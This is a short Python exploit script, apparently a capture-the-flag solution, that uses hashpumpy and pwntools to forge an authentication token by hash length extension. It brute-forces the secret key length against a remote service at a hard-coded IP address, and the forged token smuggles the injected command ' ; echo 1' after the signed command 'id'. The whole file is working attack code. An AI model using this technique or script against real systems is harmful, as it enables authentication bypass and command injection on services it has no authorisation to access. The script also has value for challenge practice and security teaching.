# To remove warnings from hashpumpy ; https://stackoverflow.com/a/879249/6262617
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

import hashpumpy
from pwn import *

# To remove remote(...) logs
context.log_level = 'ERROR'

ID_HASH = '69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a'

def get_output(token, command):
    r = remote('144.217.73.235', 27099)
    r.recvuntil(ID_HASH + '\n')
    r.sendline(command + b'|' + token.encode())
    data = r.recvall()
    if b'Bad Token' in data:
        return None
    return data

for key_len in range(100):
    token, command = hashpumpy.hashpump(ID_HASH, 'id', ' ; echo 1', key_len)
    output = get_output(token, command)

    if output:
        print(key_len, 'OK', output)
        break
    else:
        print(key_len, 'FAIL')



